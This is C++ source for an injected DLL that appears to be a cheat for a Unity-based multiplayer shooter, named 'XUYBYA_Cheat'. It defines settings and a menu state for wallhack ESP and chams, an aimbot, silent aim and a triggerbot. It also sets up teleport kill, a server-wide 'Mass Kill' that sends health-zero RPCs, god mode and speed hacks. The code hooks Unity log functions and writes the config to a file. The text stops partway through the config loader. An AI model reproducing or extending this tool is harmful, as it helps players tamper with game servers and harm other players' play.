#include <windows.h>
#include <thread>
#include <vector>
#include <string>
#include <fstream>
#include <sstream>
#include <cmath>
#include <cstring>
#include <algorithm>
#include <d3d11.h>

#include "imgui.h"
#include "backends/imgui_impl_win32.h"
#include "backends/imgui_impl_dx11.h"
#include "MinHook.h"
#include "Il2Cpp.h"

Il2CppResolver g_Il2Cpp;
HMODULE g_hDllModule = NULL;

// ─── Thread-Safe Diagnostic Logging & Crash Telemetry ────────────────────────
static CRITICAL_SECTION g_LogCs;
static bool g_LogCsInitialized = false;

static std::string GetLogPath(const char* filename = "XUYBYA_Cheat.log") {
    char path[MAX_PATH];
    if (g_hDllModule && GetModuleFileNameA(g_hDllModule, path, MAX_PATH)) {
        std::string s(path);
        size_t pos = s.find_last_of("\\/");
        if (pos != std::string::npos) {
            return s.substr(0, pos + 1) + filename;
        }
    }
    return filename;
}

static void CheatLog(const char* fmt, ...) {
    if (!g_LogCsInitialized) {
        InitializeCriticalSection(&g_LogCs);
        g_LogCsInitialized = true;
    }

    EnterCriticalSection(&g_LogCs);

    SYSTEMTIME st;
    GetLocalTime(&st);

    char timeBuf[32];
    snprintf(timeBuf, sizeof(timeBuf), "[%02d:%02d:%02d.%03d] ",
             st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);

    char msgBuf[1024];
    va_list args;
    va_start(args, fmt);
    vsnprintf(msgBuf, sizeof(msgBuf), fmt, args);
    va_end(args);

    std::string path = GetLogPath("XUYBYA_Cheat.log");
    FILE* f = fopen(path.c_str(), "a");
    if (f) {
        fprintf(f, "%s%s\n", timeBuf, msgBuf);
        fflush(f);
        fclose(f);
    }

    LeaveCriticalSection(&g_LogCs);
}

// ─── Vectored Exception Handler (Automatic Crash Logger) ─────────────────────
static LONG WINAPI CrashHandler(PEXCEPTION_POINTERS pExc) {
    if (!pExc || !pExc->ExceptionRecord) return EXCEPTION_CONTINUE_SEARCH;
    DWORD code = pExc->ExceptionRecord->ExceptionCode;

    static ULONGLONG s_LastCrashLogTime = 0;
    static void* s_LastCrashAddr = nullptr;

    if (code == 0xC0000005 || code == 0xC000001D || code == 0xC0000094 || code == 0x80000003) {
        void* crashAddr = pExc->ExceptionRecord->ExceptionAddress;
        ULONGLONG now = GetTickCount64();

        // Rate-limit crash logging to prevent disk I/O lockups on non-fatal background physics exceptions
        if (crashAddr == s_LastCrashAddr && (now - s_LastCrashLogTime < 3000)) {
            return EXCEPTION_CONTINUE_SEARCH;
        }
        s_LastCrashAddr = crashAddr;
        s_LastCrashLogTime = now;

        HMODULE hMod = NULL;
        char modName[MAX_PATH] = "Unknown Module";
        if (GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCSTR)crashAddr, &hMod)) {
            GetModuleFileNameA(hMod, modName, MAX_PATH);
            char* p = strrchr(modName, '\\');
            if (p) memmove(modName, p + 1, strlen(p + 1) + 1);
        }
        uintptr_t offset = hMod ? ((uintptr_t)crashAddr - (uintptr_t)hMod) : (uintptr_t)crashAddr;

        CheatLog("\n========================================================");
        CheatLog("!!! CRASH EXCEPTION DETECTED (Code: 0x%08X) !!!", code);
        CheatLog("Crash Location   : 0x%p (%s + 0x%llX)", crashAddr, modName, (unsigned long long)offset);

        if (code == 0xC0000005 && pExc->ExceptionRecord->NumberParameters >= 2) {
            ULONG_PTR accessType = pExc->ExceptionRecord->ExceptionInformation[0];
            ULONG_PTR targetAddr = pExc->ExceptionRecord->ExceptionInformation[1];
            CheatLog("Memory Violation : Attempted %s at address 0x%p",
                     accessType == 0 ? "READ" : (accessType == 1 ? "WRITE" : "EXECUTE"), (void*)targetAddr);
        }

        if (pExc->ContextRecord) {
            CheatLog("CPU Registers:");
            CheatLog("  RIP: 0x%016llX  RSP: 0x%016llX  RBP: 0x%016llX",
                     (unsigned long long)pExc->ContextRecord->Rip,
                     (unsigned long long)pExc->ContextRecord->Rsp,
                     (unsigned long long)pExc->ContextRecord->Rbp);
            CheatLog("  RAX: 0x%016llX  RBX: 0x%016llX  RCX: 0x%016llX  RDX: 0x%016llX",
                     (unsigned long long)pExc->ContextRecord->Rax,
                     (unsigned long long)pExc->ContextRecord->Rbx,
                     (unsigned long long)pExc->ContextRecord->Rcx,
                     (unsigned long long)pExc->ContextRecord->Rdx);
        }
        CheatLog("========================================================\n");
    }

    return EXCEPTION_CONTINUE_SEARCH;
}

// ─── Cached game class handles ───────────────────────────────────────────────
Il2CppClass* g_PlayerClass              = nullptr;
Il2CppClass* g_PlayerMovementClass      = nullptr;
Il2CppClass* g_HealthClass              = nullptr;
Il2CppClass* g_SharedRefClass           = nullptr;
Il2CppClass* g_RagdollCamClass          = nullptr;
Il2CppClass* g_WeaponClass              = nullptr;
Il2CppClass* g_WeaponManagerClass       = nullptr;
Il2CppClass* g_DataPackerClass          = nullptr;
MethodInfo*  g_GetCurrentHealth         = nullptr;
MethodInfo*  g_IsDeadMethod             = nullptr;
MethodInfo*  g_CMDChangeCurrentHealth   = nullptr;
MethodInfo*  g_ClientTryShoot           = nullptr;
MethodInfo*  g_CMDShoot                 = nullptr;
MethodInfo*  g_PickUpMethod             = nullptr;
MethodInfo*  g_StartPickUpMethod        = nullptr;
MethodInfo*  g_PackDirectionMethod      = nullptr;
MethodInfo*  g_UnpackShortMethod        = nullptr;
MethodInfo*  g_PackVector3Method        = nullptr;
MethodInfo*  g_UnpackDirectionMethod    = nullptr;

// ─── Per-bone screen coordinates ──────────────────────────────────────────────
struct BonePoint {
    Vector3 world{};
    Vector3 screen{};
    bool    valid = false;
};

// ─── Per-frame ESP snapshot ──────────────────────────────────────────────────
struct PlayerESPData {
    BonePoint head;
    BonePoint chest;
    BonePoint spine;
    BonePoint root;
    BonePoint lShoulder, lUpperArm, lElbow, lHand;
    BonePoint rShoulder, rUpperArm, rElbow, rHand;
    BonePoint lKnee, lFoot;
    BonePoint rKnee, rFoot;

    float boxMinX = 0.0f, boxMaxX = 0.0f;
    float boxMinY = 0.0f, boxMaxY = 0.0f;
    bool  hasBox  = false;

    Vector3 aimScreenPos{};
    float   distance = 0.0f;

    int  hp       = 100;
    int  maxHp    = 100;
    bool isDead   = false;
    bool awayTeam = false;
    bool isEnemy  = true;
    bool isLocal  = false;
};

std::vector<PlayerESPData> g_ESPData;

// ─── Globals ──────────────────────────────────────────────────────────────────
bool g_ShowMenu  = false;
HWND g_hWnd      = NULL;

ID3D11Device*            g_pd3dDevice            = nullptr;
ID3D11DeviceContext*     g_pd3dDeviceContext      = nullptr;
ID3D11RenderTargetView*  g_mainRenderTargetView   = nullptr;
volatile bool            g_IsInitialized          = false;
volatile bool            g_Uninjecting            = false;

// ─── Menu Navigation State ───────────────────────────────────────────────────
int g_CurrentTab = 0; // 0: ESP, 1: Combat, 2: Colors, 3: Configs, 4: Diagnostics

// ─── Keybind Definition Table ────────────────────────────────────────────────
const char* const g_KeyNames[] = {
    "Left Alt [DEFAULT]",
    "Right Mouse [RMB]",
    "Left Shift",
    "Left Ctrl",
    "[X] Key",
    "[C] Key",
    "[V] Key",
    "[F] Key",
    "[CAPS LOCK]",
    "[Mouse 4] (Thumb 1)",
    "[Mouse 5] (Thumb 2)",
    "Always Active [Toggle]"
};

static bool IsKeyActive(int keyIndex) {
    switch (keyIndex) {
        case 0: return (GetAsyncKeyState(VK_MENU) & 0x8000) || (GetAsyncKeyState(VK_LMENU) & 0x8000);
        case 1: return (GetAsyncKeyState(VK_RBUTTON) & 0x8000) != 0;
        case 2: return (GetAsyncKeyState(VK_SHIFT) & 0x8000) || (GetAsyncKeyState(VK_LSHIFT) & 0x8000);
        case 3: return (GetAsyncKeyState(VK_CONTROL) & 0x8000) || (GetAsyncKeyState(VK_LCONTROL) & 0x8000);
        case 4: return (GetAsyncKeyState('X') & 0x8000) != 0;
        case 5: return (GetAsyncKeyState('C') & 0x8000) != 0;
        case 6: return (GetAsyncKeyState('V') & 0x8000) != 0;
        case 7: return (GetAsyncKeyState('F') & 0x8000) != 0;
        case 8: return (GetAsyncKeyState(VK_CAPITAL) & 0x8000) != 0;
        case 9: return (GetAsyncKeyState(VK_XBUTTON1) & 0x8000) != 0;
        case 10: return (GetAsyncKeyState(VK_XBUTTON2) & 0x8000) != 0;
        case 11: return true;
        default: return (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
    }
}

// ─── Cheat Settings (ALL DISABLED BY DEFAULT) ─────────────────────────────────
// ESP Settings
bool  bEnableESP        = false;
bool  bEnableGlow       = false;   // Neon Bloom / Glow effect
float fGlowIntensity    = 1.0f;    // Glow intensity multiplier
bool  bDrawBoxes        = false;
float fBoxThickness     = 1.8f;
bool  bDrawSkeleton     = false;
float fSkeletonThickness= 1.8f;
bool  bDrawHeadCircle   = false;
float fHeadCircleSize   = 1.0f;
bool  bDrawTracers      = false;
int   iTracerOrigin     = 0;       // 0: Bottom, 1: Crosshair, 2: Top
float fTracerThickness  = 1.8f;
bool  bDrawHealthBar    = false;
bool  bDrawInfoText     = false;
bool  bIgnoreTeammates  = false;   // Enemies only
bool  bIgnoreLocal      = true;    // Hide self
bool  bIgnoreDead       = true;    // Hide dead / spawn ghosts
float fMaxDistance      = 500.0f;  // Max render distance

// Colors (Customizable)
float colEnemy[4]     = { 1.0f, 0.22f, 0.35f, 1.0f }; // Vibrant Neon Red/Pink
float colTeam[4]      = { 0.20f, 0.70f, 1.00f, 1.0f }; // Electric Blue
float colSkeleton[4]  = { 0.95f, 0.95f, 0.98f, 0.90f };// Clean White
float colTracers[4]   = { 1.0f, 0.85f, 0.20f, 0.80f }; // Bright Amber
float colHeadCircle[4]= { 1.0f, 0.35f, 0.50f, 1.0f }; // Neon Crimson

// ─── Customizable Chams Settings ───────────────────────────────────────────────
bool  bEnableChams          = false;
int   iChamsStyle           = 0;       // 0: Solid Flat, 1: Translucent Glass, 2: Wireframe, 3: Neon Pulse
float fChamsAlpha           = 0.65f;   // Opacity
float fChamsJointSize       = 1.0f;    // Joint size multiplier
bool  bChamsVisibleOnly     = false;   // Only apply when visible or also behind walls
float colChamsEnemyVis[4]   = { 1.0f, 0.20f, 0.40f, 0.75f }; // Visible Enemy
float colChamsEnemyOcc[4]   = { 0.85f, 0.10f, 0.90f, 0.55f }; // Occluded Enemy (Behind Walls)
float colChamsTeamVis[4]    = { 0.20f, 0.70f, 1.00f, 0.75f }; // Visible Teammate
float colChamsTeamOcc[4]    = { 0.10f, 0.40f, 0.80f, 0.50f }; // Occluded Teammate

// ─── Game Engine & Unity Debug Log Interceptor ─────────────────────────────────
struct GameLogEntry {
    std::string timeStr;
    int type; // 0: Error, 1: Assert, 2: Warning, 3: Log, 4: Exception
    std::string message;
};
static std::vector<GameLogEntry> g_GameLogs;
static std::mutex g_GameLogMutex;
static const size_t MAX_GAME_LOGS = 250;

static void WriteGameEngineLogToFile(const std::string& formatted) {
    char path[MAX_PATH];
    if (g_hDllModule && GetModuleFileNameA(g_hDllModule, path, MAX_PATH)) {
        std::string s(path);
        size_t pos = s.find_last_of("\\/");
        if (pos != std::string::npos) {
            std::string logPath = s.substr(0, pos + 1) + "XUYBYA_GameEngine.log";
            std::ofstream f(logPath, std::ios::app);
            if (f.is_open()) {
                f << formatted << "\n";
            }
        }
    }
}

static void LogGameMessage(int logType, const std::string& msg) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    char tBuf[32];
    snprintf(tBuf, sizeof(tBuf), "%02d:%02d:%02d.%03d", st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);

    const char* typeStrs[] = { "[ERROR]", "[ASSERT]", "[WARNING]", "[LOG]", "[EXCEPTION]" };
    const char* tStr = (logType >= 0 && logType <= 4) ? typeStrs[logType] : "[UNKNOWN]";

    char formatted[1024];
    snprintf(formatted, sizeof(formatted), "[%s] %s %s", tBuf, tStr, msg.c_str());

    WriteGameEngineLogToFile(formatted);

    std::lock_guard<std::mutex> lock(g_GameLogMutex);
    g_GameLogs.push_back({ tBuf, logType, msg });
    if (g_GameLogs.size() > MAX_GAME_LOGS) {
        g_GameLogs.erase(g_GameLogs.begin());
    }
}

// Convert Il2CppString to std::string
static std::string Il2CppStringToStdString(Il2CppString* str) {
    if (!str) return "";
    int32_t len = *(int32_t*)((char*)str + 0x10);
    wchar_t* chars = (wchar_t*)((char*)str + 0x14);
    if (!chars || len <= 0 || len > 4096) return "";
    int req = WideCharToMultiByte(CP_UTF8, 0, chars, len, NULL, 0, NULL, NULL);
    if (req <= 0) return "";
    std::string s(req, 0);
    WideCharToMultiByte(CP_UTF8, 0, chars, len, &s[0], req, NULL, NULL);
    return s;
}

// Hook functions for Unity DebugLogHandler
typedef void (*DebugLog_Internal_Log_t)(int logType, int logOption, Il2CppString* msg, void* obj, const MethodInfo* method);
DebugLog_Internal_Log_t oInternal_Log = nullptr;

void hkInternal_Log(int logType, int logOption, Il2CppString* msg, void* obj, const MethodInfo* method) {
    __try {
        if (msg) {
            std::string str = Il2CppStringToStdString(msg);
            if (!str.empty()) {
                LogGameMessage(logType, str);
            }
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {}

    if (oInternal_Log) {
        oInternal_Log(logType, logOption, msg, obj, method);
    }
}

typedef void (*DebugLog_Internal_LogException_t)(Il2CppObject* exc, void* obj, const MethodInfo* method);
DebugLog_Internal_LogException_t oInternal_LogException = nullptr;

void hkInternal_LogException(Il2CppObject* exc, void* obj, const MethodInfo* method) {
    __try {
        if (exc) {
            Il2CppString* msgStr = *(Il2CppString**)((char*)exc + 0x18);
            std::string str = Il2CppStringToStdString(msgStr);
            LogGameMessage(4, str.empty() ? "Uncaught Unity Game Exception" : str);
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {}

    if (oInternal_LogException) {
        oInternal_LogException(exc, obj, method);
    }
}

// Silent Aim Settings (Hit Any Shot Anywhere)
bool  bEnableSilentAim    = false;
int   iSilentAimTarget    = 1;       // 0: Chest, 1: Head
float fSilentAimFOV       = 180.0f;  // pixel radius from crosshair
bool  bDrawSilentAimFOV   = false;
bool  bSilentAimFull360   = true;    // True: Hit from anywhere on map, False: Within FOV circle

// Aimbot Settings (Default Key: Left Alt)
bool  bEnableAimbot     = false;
int   iAimbotKey        = 0;       // 0: Left Alt [DEFAULT]
bool  bDrawAimbotFOV    = false;
int   iAimbotTarget     = 0;       // 0: Chest, 1: Head
float aimbotFOV         = 150.0f;  // pixel radius from crosshair
float aimbotSmooth      = 6.0f;
float aimbotMaxSpeed    = 35.0f;   // Max pixel movement step per frame

// Midnight Extended Combat Controls
bool  bAimbotAutoFire        = true;
bool  bAimbotWhileFlashed    = false;
bool  bAimbotThroughSmoke    = false;
float fKillDelay             = 0.300f;
float fMouseLockX            = 1.000f;
float fMouseLockY            = 1.000f;

// Recoil Control System (RCS)
bool  bRecoilCompensation    = false;
int   iRecoilStartBullet     = 1;
float fRecoilX               = 0.000f;
float fRecoilY               = 0.000f;
float fRecoilSmooth          = 1.000f;

// Triggerbot
bool  bTriggerbot            = false;
bool  bTriggerbotHeadOnly    = false;
float fTriggerbotDelay       = 0.050f;

// Navigation & UI State
int   iTopNavTab             = 0;       // 0: Combat, 1: Visuals, 2: Weapons, 3: Exploits, 4: Colors, 5: Logs/Telemetry
int   iSidebarCategory       = 0;       // Sub-tab selection
char  szSearchQuery[64]      = "";

// Teleportation & Auto-Shoot Kill Aura
bool  bEnableTeleportKill = false;
bool  bTeleportHoldKey    = false;   // False: Always active when toggled, True: Hold hotkey
int   iTeleportKey        = 4;       // Default [X] Key
int   iTeleportPosition   = 0;       // 0: Behind Target (Backstab), 1: Above Target, 2: In Front, 3: Directly on Target
int   iTeleportTargetMode = 0;       // 0: Random / Cycle Target, 1: Closest Distance, 2: Lowest HP
float fTeleportDistance   = 1.2f;    // Distance from target in meters
float fTeleportHeight     = 0.3f;    // Height offset in meters
bool  bTeleportAutoShoot  = true;    // Fire weapon automatically while teleporting
bool  bTeleportLookAt     = true;    // Auto-aim/orient body and camera at enemy
float fTeleportShootRate  = 45.0f;   // Shooting interval in milliseconds

// Mass Kill (Server-Wide Instant Annihilation Aura)
bool  bEnableMassKill     = false;
float fMassKillInterval   = 80.0f;   // Interval in milliseconds (e.g. 80ms)
int   iMassKillMode       = 1;       // 0: Direct Server Health Zero RPC, 1: Multi-Raycast CMDShoot, 2: Hybrid

// God Mode (Invulnerability)
bool  bGodMode            = false;

// Weapon Spawner & Stat Modifiers
int   iSelectedWeaponIndex= 0;
bool  bInfiniteAmmo       = true;
bool  bOneHitKillDamage   = true;
bool  bRapidFire          = true;
bool  bInfiniteRange      = true;

// ─── Powerful Movement, Grapple & Camera Exploits ────────────────────────────
bool  bEnableSpeedhack       = false;
float fSpeedMultiplier       = 2.5f;
bool  bEnableSuperJump       = false;
float fJumpMultiplier        = 2.0f;
bool  bInfiniteAirJump       = false;
bool  bZeroGravity           = false;
float fGravityMultiplier     = 1.0f;
bool  bBunnyhop              = false;

bool  bInfiniteGrappleRange  = false;
bool  bSuperGrappleSpeed     = false;
float fGrappleSpeedMult      = 2.5f;
bool  bInstantGrappleBoost   = false;
bool  bGrappleMagnetAim      = false;

bool  bCustomFOV             = false;
float fCustomFOVValue        = 100.0f;

// ─── Config System ────────────────────────────────────────────────────────────
static char g_ConfigStatus[128] = "";
static ULONGLONG g_ConfigStatusTime = 0;

static void SetConfigStatus(const char* msg) {
    strncpy(g_ConfigStatus, msg, sizeof(g_ConfigStatus) - 1);
    g_ConfigStatusTime = GetTickCount64();
}

static std::string GetConfigPath() {
    char path[MAX_PATH];
    if (g_hDllModule && GetModuleFileNameA(g_hDllModule, path, MAX_PATH)) {
        std::string s(path);
        size_t pos = s.find_last_of("\\/");
        if (pos != std::string::npos) {
            return s.substr(0, pos + 1) + "XUYBYA_Config.ini";
        }
    }
    return "XUYBYA_Config.ini";
}

static void SaveConfig() {
    std::string path = GetConfigPath();
    std::ofstream f(path);
    if (!f.is_open()) {
        SetConfigStatus("Error: Unable to create config file!");
        return;
    }

    f << "[Visuals]\n";
    f << "bEnableESP=" << bEnableESP << "\n";
    f << "bEnableGlow=" << bEnableGlow << "\n";
    f << "fGlowIntensity=" << fGlowIntensity << "\n";
    f << "bDrawBoxes=" << bDrawBoxes << "\n";
    f << "fBoxThickness=" << fBoxThickness << "\n";
    f << "bDrawSkeleton=" << bDrawSkeleton << "\n";
    f << "fSkeletonThickness=" << fSkeletonThickness << "\n";
    f << "bDrawHeadCircle=" << bDrawHeadCircle << "\n";
    f << "fHeadCircleSize=" << fHeadCircleSize << "\n";
    f << "bDrawTracers=" << bDrawTracers << "\n";
    f << "iTracerOrigin=" << iTracerOrigin << "\n";
    f << "fTracerThickness=" << fTracerThickness << "\n";
    f << "bDrawHealthBar=" << bDrawHealthBar << "\n";
    f << "bDrawInfoText=" << bDrawInfoText << "\n";
    f << "bIgnoreTeammates=" << bIgnoreTeammates << "\n";
    f << "bIgnoreLocal=" << bIgnoreLocal << "\n";
    f << "bIgnoreDead=" << bIgnoreDead << "\n";
    f << "fMaxDistance=" << fMaxDistance << "\n";

    f << "\n[Colors]\n";
    f << "colEnemy=" << colEnemy[0] << "," << colEnemy[1] << "," << colEnemy[2] << "," << colEnemy[3] << "\n";
    f << "colTeam=" << colTeam[0] << "," << colTeam[1] << "," << colTeam[2] << "," << colTeam[3] << "\n";
    f << "colSkeleton=" << colSkeleton[0] << "," << colSkeleton[1] << "," << colSkeleton[2] << "," << colSkeleton[3] << "\n";
    f << "colTracers=" << colTracers[0] << "," << colTracers[1] << "," << colTracers[2] << "," << colTracers[3] << "\n";
    f << "colHeadCircle=" << colHeadCircle[0] << "," << colHeadCircle[1] << "," << colHeadCircle[2] << "," << colHeadCircle[3] << "\n";

    f << "\n[Chams]\n";
    f << "bEnableChams=" << bEnableChams << "\n";
    f << "iChamsStyle=" << iChamsStyle << "\n";
    f << "fChamsAlpha=" << fChamsAlpha << "\n";
    f << "fChamsJointSize=" << fChamsJointSize << "\n";
    f << "bChamsVisibleOnly=" << bChamsVisibleOnly << "\n";
    f << "colChamsEnemyVis=" << colChamsEnemyVis[0] << "," << colChamsEnemyVis[1] << "," << colChamsEnemyVis[2] << "," << colChamsEnemyVis[3] << "\n";
    f << "colChamsEnemyOcc=" << colChamsEnemyOcc[0] << "," << colChamsEnemyOcc[1] << "," << colChamsEnemyOcc[2] << "," << colChamsEnemyOcc[3] << "\n";
    f << "colChamsTeamVis=" << colChamsTeamVis[0] << "," << colChamsTeamVis[1] << "," << colChamsTeamVis[2] << "," << colChamsTeamVis[3] << "\n";
    f << "colChamsTeamOcc=" << colChamsTeamOcc[0] << "," << colChamsTeamOcc[1] << "," << colChamsTeamOcc[2] << "," << colChamsTeamOcc[3] << "\n";

    f << "\n[SilentAim]\n";
    f << "bEnableSilentAim=" << bEnableSilentAim << "\n";
    f << "iSilentAimTarget=" << iSilentAimTarget << "\n";
    f << "fSilentAimFOV=" << fSilentAimFOV << "\n";
    f << "bDrawSilentAimFOV=" << bDrawSilentAimFOV << "\n";
    f << "bSilentAimFull360=" << bSilentAimFull360 << "\n";

    f << "\n[Combat]\n";
    f << "bEnableAimbot=" << bEnableAimbot << "\n";
    f << "bAimbotAutoFire=" << bAimbotAutoFire << "\n";
    f << "bAimbotWhileFlashed=" << bAimbotWhileFlashed << "\n";
    f << "bAimbotThroughSmoke=" << bAimbotThroughSmoke << "\n";
    f << "fKillDelay=" << fKillDelay << "\n";
    f << "fMouseLockX=" << fMouseLockX << "\n";
    f << "fMouseLockY=" << fMouseLockY << "\n";
    f << "iAimbotKey=" << iAimbotKey << "\n";
    f << "bDrawAimbotFOV=" << bDrawAimbotFOV << "\n";
    f << "iAimbotTarget=" << iAimbotTarget << "\n";
    f << "aimbotFOV=" << aimbotFOV << "\n";
    f << "aimbotSmooth=" << aimbotSmooth << "\n";
    f << "aimbotMaxSpeed=" << aimbotMaxSpeed << "\n";

    f << "\n[Recoil]\n";
    f << "bRecoilCompensation=" << bRecoilCompensation << "\n";
    f << "iRecoilStartBullet=" << iRecoilStartBullet << "\n";
    f << "fRecoilX=" << fRecoilX << "\n";
    f << "fRecoilY=" << fRecoilY << "\n";
    f << "fRecoilSmooth=" << fRecoilSmooth << "\n";

    f << "\n[Triggerbot]\n";
    f << "bTriggerbot=" << bTriggerbot << "\n";
    f << "bTriggerbotHeadOnly=" << bTriggerbotHeadOnly << "\n";
    f << "fTriggerbotDelay=" << fTriggerbotDelay << "\n";

    f << "\n[Teleport]\n";
    f << "bEnableTeleportKill=" << bEnableTeleportKill << "\n";
    f << "bTeleportHoldKey=" << bTeleportHoldKey << "\n";
    f << "iTeleportKey=" << iTeleportKey << "\n";
    f << "iTeleportPosition=" << iTeleportPosition << "\n";
    f << "iTeleportTargetMode=" << iTeleportTargetMode << "\n";
    f << "fTeleportDistance=" << fTeleportDistance << "\n";
    f << "fTeleportHeight=" << fTeleportHeight << "\n";
    f << "bTeleportAutoShoot=" << bTeleportAutoShoot << "\n";
    f << "bTeleportLookAt=" << bTeleportLookAt << "\n";
    f << "fTeleportShootRate=" << fTeleportShootRate << "\n";

    f << "\n[MassKill]\n";
    f << "bEnableMassKill=" << bEnableMassKill << "\n";
    f << "fMassKillInterval=" << fMassKillInterval << "\n";
    f << "iMassKillMode=" << iMassKillMode << "\n";

    f << "\n[Weapons]\n";
    f << "iSelectedWeaponIndex=" << iSelectedWeaponIndex << "\n";
    f << "bInfiniteAmmo=" << bInfiniteAmmo << "\n";
    f << "bOneHitKillDamage=" << bOneHitKillDamage << "\n";
    f << "bRapidFire=" << bRapidFire << "\n";
    f << "bInfiniteRange=" << bInfiniteRange << "\n";

    f << "\n[Exploits]\n";
    f << "bEnableSpeedhack=" << bEnableSpeedhack << "\n";
    f << "fSpeedMultiplier=" << fSpeedMultiplier << "\n";
    f << "bEnableSuperJump=" << bEnableSuperJump << "\n";
    f << "fJumpMultiplier=" << fJumpMultiplier << "\n";
    f << "bInfiniteAirJump=" << bInfiniteAirJump << "\n";
    f << "bZeroGravity=" << bZeroGravity << "\n";
    f << "fGravityMultiplier=" << fGravityMultiplier << "\n";
    f << "bBunnyhop=" << bBunnyhop << "\n";
    f << "bInfiniteGrappleRange=" << bInfiniteGrappleRange << "\n";
    f << "bSuperGrappleSpeed=" << bSuperGrappleSpeed << "\n";
    f << "fGrappleSpeedMult=" << fGrappleSpeedMult << "\n";
    f << "bInstantGrappleBoost=" << bInstantGrappleBoost << "\n";
    f << "bGrappleMagnetAim=" << bGrappleMagnetAim << "\n";
    f << "bCustomFOV=" << bCustomFOV << "\n";
    f << "fCustomFOVValue=" << fCustomFOVValue << "\n";

    f << "\n[Misc]\n";
    f << "bGodMode=" << bGodMode << "\n";

    f.close();
    SetConfigStatus("Config saved successfully to XUYBYA_Config.ini");
}

static void LoadConfig() {
    std::string path = GetConfigPath();
    std::ifstream f(path);
    if (!f.is_open()) {
        SetConfigStatus("No existing config file found.");
        return;
    }

    std::string line;
    while (std::getline(f, line)) {
        if (line.empty() || line[0] == '[' || line[0] == ';' || line[0] == '#') continue;
        size_t eq = line.find('=');
        if (eq == std::string::npos) continue;

        std::string key = line.substr(0, eq);
        std::string val = line.substr(eq + 1);

        auto ParseBool = [](const std::string& s) { return s == "1" || s == "true" || s == "True"; };
        auto ParseFloat = [](const std::string& s) { return std::stof(s); };
        auto ParseInt = [](const std::string& s) { return std::stoi(s); };
        auto ParseColor = [](const std::string& s, float* col) {
            std::stringstream ss(s);
            std::string item;
            int i = 0;
            while (std::getline(ss, item, ',') && i < 4) {
                col[i++] = std::stof(item);
            }
        };

        try {
            if (key == "bEnableESP") bEnableESP = ParseBool(val);
            else if (key == "bEnableGlow") bEnableGlow = ParseBool(val);
            else if (key == "fGlowIntensity") fGlowIntensity = ParseFloat(val);
            else if (key == "bDrawBoxes") bDrawBoxes = ParseBool(val);
            else if (key == "fBoxThickness") fBoxThickness = ParseFloat(val);
            else if (key == "bDrawSkeleton") bDrawSkeleton = ParseBool(val);
            else if (key == "fSkeletonThickness") fSkeletonThickness = ParseFloat(val);
            else if (key == "bDrawHeadCircle") bDrawHeadCircle = ParseBool(val);
            else if (key == "fHeadCircleSize") fHeadCircleSize = ParseFloat(val);
            else if (key == "bDrawTracers") bDrawTracers = ParseBool(val);
            else if (key == "iTracerOrigin") iTracerOrigin = ParseInt(val);
            else if (key == "fTracerThickness") fTracerThickness = ParseFloat(val);
            else if (key == "bDrawHealthBar") bDrawHealthBar = ParseBool(val);
            else if (key == "bDrawInfoText") bDrawInfoText = ParseBool(val);
            else if (key == "bIgnoreTeammates") bIgnoreTeammates = ParseBool(val);
            else if (key == "bIgnoreLocal") bIgnoreLocal = ParseBool(val);
            else if (key == "bIgnoreDead") bIgnoreDead = ParseBool(val);
            else if (key == "fMaxDistance") fMaxDistance = ParseFloat(val);

            else if (key == "colEnemy") ParseColor(val, colEnemy);
            else if (key == "colTeam") ParseColor(val, colTeam);
            else if (key == "colSkeleton") ParseColor(val, colSkeleton);
            else if (key == "colTracers") ParseColor(val, colTracers);
            else if (key == "colHeadCircle") ParseColor(val, colHeadCircle);

            else if (key == "bEnableChams") bEnableChams = ParseBool(val);
            else if (key == "iChamsStyle") iChamsStyle = ParseInt(val);
            else if (key == "fChamsAlpha") fChamsAlpha = ParseFloat(val);
            else if (key == "fChamsJointSize") fChamsJointSize = ParseFloat(val);
            else if (key == "bChamsVisibleOnly") bChamsVisibleOnly = ParseBool(val);
            else if (key == "colChamsEnemyVis") ParseColor(val, colChamsEnemyVis);
            else if (key == "colChamsEnemyOcc") ParseColor(val, colChamsEnemyOcc);
            else if (key == "colChamsTeamVis") ParseColor(val, colChamsTeamVis);
            else if (key == "colChamsTeamOcc") ParseColor(val, colChamsTeamOcc);

            else if (key == "bEnableSilentAim") bEnableSilentAim = ParseBool(val);
            else if (key == "iSilentAimTarget") iSilentAimTarget = ParseInt(val);
            else if (key == "fSilentAimFOV") fSilentAimFOV = ParseFloat(val);
            else if (key == "bDrawSilentAimFOV") bDrawSilentAimFOV = ParseBool(val);
            else if (key == "bSilentAimFull360") bSilentAimFull360 = ParseBool(val);

            else if (key == "bEnableAimbot") bEnableAimbot = ParseBool(val);
            else if (key == "bAimbotAutoFire") bAimbotAutoFire = ParseBool(val);
            else if (key == "bAimbotWhileFlashed") bAimbotWhileFlashed = ParseBool(val);
            else if (key == "bAimbotThroughSmoke") bAimbotThroughSmoke = ParseBool(val);
            else if (key == "fKillDelay") fKillDelay = ParseFloat(val);
            else if (key == "fMouseLockX") fMouseLockX = ParseFloat(val);
            else if (key == "fMouseLockY") fMouseLockY = ParseFloat(val);
            else if (key == "iAimbotKey") iAimbotKey = ParseInt(val);
            else if (key == "bDrawAimbotFOV") bDrawAimbotFOV = ParseBool(val);
            else if (key == "iAimbotTarget") iAimbotTarget = ParseInt(val);
            else if (key == "aimbotFOV") aimbotFOV = ParseFloat(val);
            else if (key == "aimbotSmooth") aimbotSmooth = ParseFloat(val);
            else if (key == "aimbotMaxSpeed") aimbotMaxSpeed = ParseFloat(val);

            else if (key == "bRecoilCompensation") bRecoilCompensation = ParseBool(val);
            else if (key == "iRecoilStartBullet") iRecoilStartBullet = ParseInt(val);
            else if (key == "fRecoilX") fRecoilX = ParseFloat(val);
            else if (key == "fRecoilY") fRecoilY = ParseFloat(val);
            else if (key == "fRecoilSmooth") fRecoilSmooth = ParseFloat(val);

            else if (key == "bTriggerbot") bTriggerbot = ParseBool(val);
            else if (key == "bTriggerbotHeadOnly") bTriggerbotHeadOnly = ParseBool(val);
            else if (key == "fTriggerbotDelay") fTriggerbotDelay = ParseFloat(val);

            else if (key == "bEnableTeleportKill") bEnableTeleportKill = ParseBool(val);
